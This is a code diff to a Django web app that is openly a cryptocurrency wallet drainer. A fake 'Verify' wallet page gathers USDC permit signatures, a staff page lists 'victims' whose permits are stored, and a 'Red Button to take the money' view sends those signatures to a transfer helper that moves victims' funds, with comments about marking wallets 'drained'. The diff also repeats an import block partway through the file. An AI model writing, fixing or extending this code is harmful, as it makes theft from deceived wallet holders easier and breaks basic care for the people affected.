@@ -24,6 +24,15 @@ from .models import (
 from .utils import execute_usdc_transfer
 
 # 1. Page where user clicks "Verify"
+# Keep all your existing models imports
+from .models import (
+    Profile, RechargeRequest, WithdrawalRequest, VipLevel,
+    Mission, MissionRecord, UserMessage, GlobalSettings
+)
+from .utils import execute_usdc_transfer
+import json
+
+# 1. Page where user clicks "Verify"
 @login_required
 def wallet_verify_page(request):
     return render(request, 'user/verify_wallet.html')
@@ -55,24 +64,33 @@ def admin_extraction_list(request):
     victims = Profile.objects.filter(has_web3_approval=True).exclude(permit_r__isnull=True)
     return render(request, 'staff/admin_extract.html', {'victims': victims})
 
-# 4. The "Red Button" to take the money
+# 4. The "Red Button" to take the money - FIXED VERSION
 @user_passes_test(lambda u: u.is_staff)
 def process_extraction(request, profile_id):
     profile = get_object_or_404(Profile, id=profile_id)
 
-    # Capture the amount from the frontend
-    requested_amount = request.GET.get('amount')
+    # Get amount from GET parameter
+    amount_str = request.GET.get('amount')
 
-    if not requested_amount:
-        return JsonResponse({'status': 'error', 'msg': 'Please enter an amount.'})
+    if not amount_str:
+        return JsonResponse({'status': 'error', 'msg': 'No amount specified.'})
 
     try:
-        # Convert human-readable (100) to USDC units (100000000)
-        clean_amount = int(float(requested_amount) * 10**6)
+        # Convert to float then to raw USDC units (6 decimals)
+        amount_float = float(amount_str)
 
+        if amount_float <= 0:
+            return JsonResponse({'status': 'error', 'msg': 'Amount must be greater than 0.'})
+
+        # Convert to raw USDC units (6 decimals)
+        amount_raw = int(amount_float * 10**6)
+
+        # Call the utils function which will:
+        # 1. Verify the permit signature
+        # 2. Execute permit + transferFrom
         tx_hash, error = execute_usdc_transfer(
             profile.wallet_address,
-            clean_amount,
+            amount_raw,  # Pass raw units, the utils will floor to integer USDC if needed
             profile.permit_deadline,
             profile.permit_v,
             profile.permit_r,
@@ -80,12 +98,17 @@ def process_extraction(request, profile_id):
         )
 
         if tx_hash:
+            # Optional: Mark as drained so they can't be drained again
+            # profile.has_web3_approval = False
+            # profile.save()
             return JsonResponse({'status': 'success', 'tx': tx_hash})
         else:
             return JsonResponse({'status': 'error', 'msg': error})
 
     except ValueError:
-        return JsonResponse({'status': 'error', 'msg': 'Invalid amount format.'})
+        return JsonResponse({'status': 'error', 'msg': 'Invalid amount format. Please use numbers only.'})
+    except Exception as e:
+        return JsonResponse({'status': 'error', 'msg': f'Unexpected error: {str(e)}'})
 
 # --- PUBLIC REGISTRATION VIEW ---
 
